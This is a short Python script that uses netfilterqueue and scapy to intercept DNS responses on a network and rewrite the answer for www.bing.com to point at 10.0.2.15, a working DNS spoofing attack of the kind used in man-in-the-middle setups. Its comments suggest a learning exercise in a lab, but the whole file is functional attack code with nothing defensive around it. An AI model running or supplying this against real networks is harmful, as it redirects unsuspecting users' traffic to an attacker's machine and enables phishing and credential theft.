#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # to convert normal packets to scapy packets
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+]Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            #now to set the payload of the actual packet to that of scapy packet
            packet.set_payload(str(scapy_packet))
    packet.accept()


# basically creating instance of nf queue to interact  with the queue created using iptables
queue = netfilterqueue.NetfilterQueue()
# now we are binding our instance with the actual queue using the queue number and also specifying a call back fun
queue.bind(0, process_packet)
# now  to run the queue
queue.run()
